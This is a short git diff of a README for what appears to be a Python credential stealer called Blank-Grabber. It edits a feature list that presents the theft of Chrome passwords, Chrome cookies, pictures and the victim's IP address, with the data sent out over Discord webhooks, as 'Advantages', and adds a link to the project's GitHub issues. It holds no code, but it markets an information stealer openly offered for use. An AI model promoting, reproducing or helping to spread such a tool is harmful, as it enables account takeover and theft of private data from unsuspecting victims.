@@ -5,11 +5,14 @@
 ***You must have python 3.7+ for this to work!***
 
 ## Advantages:
-    1) Grabs Pictures (v1.2 only)
+    1) Grabs Pictures (v1.2 only).
     2) Grabs Chrome Passwords.
     3) Grabs Chrome Cookies.
-    4) Grab IP.
-    5) Send Data Through Discord Webhooks.
+    4) Grabs IP.
+    5) Sends Data Through Discord Webhooks.
     
 ## Disadvantages:
-    1) Grabber is a little bit slow.
+    1) Python Grabbers Are slow.
+
+# Suggestions? Issues? Questions?
+[![Click here](https://img.shields.io/badge/Click%20here-blue)](https://github.com/Blank-c/Blank-Grabber/issues)
